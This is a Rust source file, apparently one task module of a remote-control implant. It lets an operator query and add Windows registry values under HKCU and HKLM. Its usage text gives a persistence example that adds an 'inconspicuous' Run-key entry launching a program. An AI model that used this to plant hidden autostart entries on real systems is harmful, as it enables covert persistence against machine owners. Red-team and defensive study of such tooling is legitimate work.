use crate::internal::listener::{TaskHandler};

#[cfg(not(target_os = "windows"))]
use crate::internal::tasks::unsupported;

pub static COMMAND: &str = "reg";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("Executing command `{}` with args `{:?}`", COMMAND, args.clone());

        if args.len() < 2 || args.len() > 4 {
            return Ok("Invalid number of arguments received. Usage: 'reg [query|add] [path] <optional: key> <optional: value>'. Example: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run inconspicuous calc.exe'".to_string());
        }

        #[cfg(target_os = "windows")]
        {
            use winreg::RegKey;

            let command = args.first().unwrap();
            let path = args.get(1).unwrap();

            let key = match args.get(2) {
                None => "(Default)",
                Some(s) => s
            };

            let value = match args.get(3) {
                None => "",
                Some(s) => s
            };

            let split_path = path.split("\\");
            let split_path_vec: Vec<&str> = split_path.collect();

            let handler = match split_path_vec.first() {
                None => return Ok("Unable to parse registry path. Please use format: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'.".to_string()),
                Some(s) => match s.to_ascii_lowercase().as_ref() {
                    "hkcu" => RegKey::predef(winreg::enums::HKEY_CURRENT_USER),
                    "hklm" => RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE),
                    &_ => return Ok("Invalid registry. Only 'HKCU' and 'HKLM' are supported at this time.".to_string())
                }
            };

            let registry_path = split_path_vec[1..].join("\\");

            return match command.as_str() {
                "query" => {
                    let cur_ver = handler.open_subkey(registry_path)?;
                    let result = cur_ver.get_value(key)?;

                    Ok(result)
                },
                "add" => {
                    let (k, _) = handler.create_subkey(registry_path)?;
                    k.set_value(key.to_string(), &value.to_string())?;

                    Ok("Successfully set registry value.".to_string())
                },
                &_ => Ok("Unknown reg command. Please use 'reg query' or 'reg add' followed by the path (and value when adding a key).".to_string())
            };
        }

        #[cfg(not(target_os = "windows"))]
        Ok(unsupported::reply(COMMAND))
    }
}